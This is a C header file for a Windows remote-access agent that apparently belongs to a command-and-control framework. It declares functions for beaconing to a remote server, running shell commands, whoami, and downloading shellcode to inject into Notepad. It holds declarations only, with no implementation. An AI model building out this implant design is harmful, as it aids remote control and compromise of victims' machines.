#ifndef AGENT_H
#define AGENT_H

#include <windows.h>
#include "./typedefs.h"
#include "./task.h"

#define AGENT_REMOTE_SERVER_MAX_LENGTH 128
#define AGENT_MAGIC 0x4145  // EA

typedef DWORD AGENT_INTERVAL;

/*
TaskMapping taskMappings[] = {
    {TASK_CMD, _AgentExecuteCmd},
    {TASK_WHOAMI, _AgentExecuteWhoami},
    // Add more mappings as needed...
};
*/


/**
 * @struct_ Agent_
 * This struct represents an agent, there is only one agent per executable.
 */
typedef struct Agent_ {
    DWORD _magic;                                         // the magic byte to identify the agent  (must be set to macro AGENT_MAGIC)
    AGENT_INTERVAL _interval;                             // the interval in between server callbacks
    WCHAR _remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH];  // the server IP or URL that the agent will connect to
    INTERNET_PORT _remotePort;                            // the port for the server 
    PAPI api;                                             // the api that has dynamically imported Win32 functions
} Agent, *PAgent;


/**
 * @fn Agent* AgentAllocate
 *
 * @brief Allocates memory for an Agent structure on heap and its magic byte.
 *
 * @param MALLOC malloc: a pointer to the malloc function
 *
 * @return Agent*: a pointer to the allocated Agent structure
 *                 this will be set to NULL if allocation fails.
 *
 * @see AgentCreate()
 * @see AgentFree()
 *
 * @note If allocation fails, the return value is NULL
 * @note Populate the struct members with `AgentPopulate` and free the agent with `AgentFree`
 * @note `api` must have the `malloc` function initialized
 */
Agent* AgentAllocate(MALLOC malloc);


/**
 * @fn BOOL AgentPopulate
 *
 * @brief Populates an agent's members and sets its magic byte.
 *
 * @param _In_ Agent* agent: a pointer to an agent that will be populated
 * @param _In_ CONST WCHAR remoteServer[REMOTE_SERVER_MAX_LENGTH]: a null terminated WCHAR array that the agent will connect to
 * @param _In_ CONST SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
 * @param _In_ CONST INTERNET_PORT remotePort: the server port to connect to
 * @param _In_ CONST AGENT_INTERVAL interval: the interval in between server callbacks
 * @param _In_ PAPI api interval: the struct that has dynamically imported Win32 api calls
 *
 * @return BOOL: TRUE if population is successful
 *               FALSE if population fails
 *
 * @note Ensure that the `agent` pointer is valid and points to an allocated `Agent` structure before calling this function.
 *
 * @see AgentAllocate()
 * @see AgentFree()
 *
 * @note If population of a member fails, the function returns FALSE and all the members are considered uninitialized
 * @note Allocate the struct with `AgentAllocate` and free the agent with `AgentFree`
 */
BOOL AgentPopulate(_In_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength, _In_ CONST INTERNET_PORT remotePort, _In_ CONST AGENT_INTERVAL interval, _In_ PAPI api);


/**
 * @fn VOID AgentFree
 *
 * @brief Frees the memory allocated for an Agent structure.
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure to be freed.
 *
 * @return BOOL: TRUE if freeing is successful
 *               FALSE if freeing fails
 *
 * @note Ensure that the pointer passed to this function is on heap.
 *
 * @see AgentAllocate()
 * @see AgentCreate()
 *
 * @note Allocate the struct with `AgentAllocate` and populate the struct with `AgentPopulate`
 * @note `agent->api` must have the `free` function initialized
 */
BOOL AgentFree(_In_ Agent* agent);


/**
 * @fn BOOL AgentIntervalSet
 *
 * @brief Set the `_interval` member of the agent
 *
 * @param _Out_ Agent* agent: the agent whose `_interval` member will be changed
 *                             if function fails, the interval isn't changed
 * @param _In_ AGENT_INTERVAL: the new interval in milliseconds
 *
 * @return If function succeeds, TRUE
 *         If function fails, FALSE
 *
 * @note If the function fails, the interval remains unchanged
 */
BOOL AgentIntervalSet(_Out_ Agent* agent, _In_ AGENT_INTERVAL interval);


/**
 * @fn BOOL AgentTaskMappingsSet
 *
 * @brief Set the `_taskMappings[]` member of the agent
 *
 * @param _Inout_ Agent* agent: the agent whose `_taskMappings` member will be set
 *                             if function fails, the interval isn't changed
 * @param _In_ CONST TaskMapping taskMappings[]: an array of taskMappings
 * @param _In_ CONST DWORD dwNumberOfTaskMappings: the number of TaskMapping structs inside taskMappings
 *
 * @return If function succeeds, TRUE
 *         If function fails, FALSE
 *
 * @note If the function fails, the `_taskMappings` member remains unchanged
 */
//BOOL AgentTaskMappingsSet(_Inout_ Agent* agent, _In_ CONST TaskMapping taskMappings[MAX_TASK_MAPPINGS], _In_ CONST DWORD dwNumberOfTaskMappings);


/**
 * @fn BOOL AgentRemoteServerSet
 *
 * @brief Set the RemoteServer member of the agent
 *
 * @param _Out_ Agent* agent: the agent whose member `_remoteServer` will be changed
 *                             if function fails, `_remoteServer` isn't changed
 * @param _In_ WCHAR remoteServer[REMOTE_SERVER_MAX_LENGTH]: a null terminated WCHAR array that the agent will connect to
 * @param _In_ SIZE_T remoteServerLength: the length of the `remoteServer` string including the null terminator
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: If the function fails, the _remoteServer member remains unchanged
 */
BOOL AgentRemoteServerSet(_Out_ Agent* agent, _In_ CONST WCHAR remoteServer[AGENT_REMOTE_SERVER_MAX_LENGTH], _In_ CONST SIZE_T remoteServerLength);


/**
 * @fn BOOL AgentRemotePortSet
 *
 * @brief Set the RemotePort member of the agent
 *
 * @param _Out_ Agent* agent: the agent whose member `_remotePort` will be changed
 *                             if function fails, `_remotePort` isn't changed
 * @param _In_ INTERNET_PORT remotePort: the port the agent will connect to
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: make sure remotePort is between 1-65535
 * @note: If the function fails, the _remotePort member remains unchanged
 */
BOOL AgentRemotePortSet(_Out_ Agent* agent, _In_ INTERNET_PORT remotePort);


/**
 * @fn BOOL AgentApiSet
 *
 * @brief Set the api member of the agent
 *
 * @param _Out_ Agent* agent: the agent whose member `api` will be changed
 *                             if function fails, `api` isn't changed
 * @param _In_ PAPI api: a pointer to the struct that has dynamically imported Win32 api calls
 *
 * @return If function suceeds TRUE
 *         If function fails FALSE
 *
 * @note: make sure Win32 api functions in `api` is initialized
 * @note: If the function fails, the `api` member remains unchanged
 */
BOOL AgentApiSet(_Out_ Agent* agent, _In_ PAPI api);


/**
 * @fn VOID AgentSleep
 *
 * @brief Suspend the execution of the current thread
 *
 * @param _In_ PAPI api: a pointer to the API struct
 * @param Agent* agent: The sleep time is stored in milliseconds in `agent->_interval`
 *
 * @return This function returns nothing
 */
VOID AgentSleep(_In_ PAPI api, _In_ Agent* agent);


// NOTE: Does pEsgStdDll need to be freed upon shutdown?
/**
 * @fn VOID AgentExecuteTask
 *
 * @brief Executes a function and returns the result
 *
 * @param _In_ PAPI api:
 * @param _In_ PESG_STD_API pEsgStdApi:
 * @param _Out_opt_ DLL* pEsgStdDll: pointer to the standard esg dll that may be freed if a Task requires so
 * @param _In_ Task task: a Task struct to use to run a task
 * @param _Out_ CHAR** taskResult: a double pointer to a buffer that receives the task result.
 *                                 this will be set to NULL if the execution fails or if there is no task to run.
 * @param _Out_ DWORD* pdwSizeOfOutput: a pointer to a dword value that will receive the size of the result
 *                                      the data pdwSizeOfOutput will be 0 if execution fails
 *
 * @return BOOL: TRUE if execution successful, FALSE if execution fails or if there is no task to run
 *
 * @note The caller is responsible for freeing the memory allocated for pTaskResult
 * @note If execution fails, the data pointed to by pdwSizeOfOutput is 0
 * @note If execution fails, the return is FALSE otherwise the return is TRUE.
 * @note If execution fails, the data pointed to by `pTaskResult` will be NULL. Ensure to check this before using the result.
 */
BOOL AgentExecuteTask(_In_ Agent* agent, _In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ DLL* pEsgStdDll, _In_ Task task, _Out_ CHAR** pTaskResult, _Out_ DWORD* pdwSizeOfOutput);


/**
 * @fn BOOL _AgentExecuteCmd
 *
 * @brief Executes a command in the task, and retrieves the result.
 *
 * This function takes a Task struct and pointers to the API and ESG_STD_API structs, executes the command associated
 * with the task, and returns the result of the execution. The result is provided as a string along with its size.
 * The function is a private function that should not be used outside agent.c
 *
 * @param _In_ PAPI api: A pointer to the API strucutre
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
 * @param _In_ Task task: The task to be executed, which contains the command details.
 * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the command execution.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD that will receive the size of the output result.
 *
 * @return BOOL Returns TRUE if the command was executed successfully; otherwise, returns FALSE.
 *
 * @note Ensure that the pointers provided for taskResult and pdwSizeOfOutput are valid and allocated
 *       before calling this function. The caller is responsible for freeing the memory allocated for
 *       taskResult after use.
 */
BOOL _AgentExecuteCmd(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi, _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);


/**
 * @fn BOOL _AgentExecuteWhoami
 *
 * @brief Executes GetUserNameA Win32 function, and retrieves the result.
 *
 * This function takes a Task struct and pointers to the API and ESG_STD_API structs, executes the task,
 * and returns the result of the execution. The result is provided as a string along with its size.
 * The function is a private function that should not be used outside of agent.c
 *
 * @param _In_ PAPI api: A pointer to the API strucutre
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the ESG_STD_API structure with RunCmd initialized
 * @param _In_ Task task: The task to be executed.
 * @param _Out_ CHAR** taskResult: A pointer to a character pointer that will receive the result of the task.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD that will receive the size of the result.
 *
 * @return BOOL Returns TRUE if the task was executed successfully; otherwise, returns FALSE.
 *
 * @note Ensure that the pointers provided for taskResult and pdwSizeOfOutput are valid and allocated
 *       before calling this function. The caller is responsible for freeing the memory allocated for
 *       taskResult after use.
 */
BOOL _AgentExecuteWhoami(_In_ PAPI api, _In_ PESG_STD_API pEsgStdApi,  _In_ Task task, _Out_ CHAR** taskResult, _Out_ DWORD* pdwSizeOfOutput);


/**
 * @brief Executes the shutdown process for a given agent and task.
 *
 * This function constructs a JSON response containing the task ID, agent UUID,
 * and the encoded exit output. It then sends this JSON response to a specified
 * remote server and port associated with the agent. After sending the response,
 * it cleans up allocated resources and terminates the current thread.
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure
 * @param _In_ PAPI api: A pointer to the API structure
 * @param _Out_ DLL* pEsgStdDll: A pointer to a DLL structure that will be freed and set to NULL after the operation
 * @param _In_ Task task: The Task structure that contains details about the task being executed
 *
 * @return BOOL Returns TRUE if the shutdown process was successful, otherwise returns FALSE.
 *
 * @note The DLL that gets freed shouldn't matter as the program shuts down after the function.
 *       However, it's still accounted for to be future proof.
 *
 */
BOOL _AgentExecuteShutdown(_In_ Agent* agent, _In_ PAPI api, _Out_ DLL* pEsgStdDll, _In_ Task task);


/**
 * @fn BOOL _AgentExecuteAssembly
 *
 * @brief Executes an assembly injection into a specified application.
 *
 * This function retrieves executable shellcode from a remote server and injects
 * it into the Notepad application. It constructs the necessary parameters for
 * the injection process and allocates memory for the task result, which indicates
 * the execution status of the assembly.
 * // NOTE: The application to inject into should be obtained from the Agent struct
 *
 * @param _In_ Agent* agent: A pointer to the Agent structure that contains information about
 *                           the agent performing the assembly execution.
 * @param _In_ PAPI api: A pointer to the API structure that provides memory allocation and
 *                       other utility functions.
 * @param _In_ PESG_STD_API pEsgStdApi: A pointer to the standard API structure that contains the
 *                                      function for injecting code into a process.
 * @param _Out_ CHAR** pTaskResult: A pointer to a character pointer that will be allocated
 *                                  to store the result of the task execution.
 * @param _Out_ DWORD* pdwSizeOfOutput: A pointer to a DWORD value that receives the size of the
 *                                      allocated data for pTaskResult
 *
 * @return BOOL Returns TRUE if the assembly injection was initiated successfully,
 *               otherwise returns FALSE.
 *
 * @note The function assumes that Notepad is available at the specified path.
 *       It also allocates memory for the task result, which should be freed by
 *       the caller to avoid memory leaks. The function does not handle errors
 *       related to the retrieval of the shellcode or the injection process.
 */
BOOL _AgentExecuteAssembly(_In_ Agent* agent, _In_ PAPI api, PESG_STD_API pEsgStdApi, CHAR** pTaskResult, DWORD* pdwSizeOfOutput);

#endif // AGENT_H

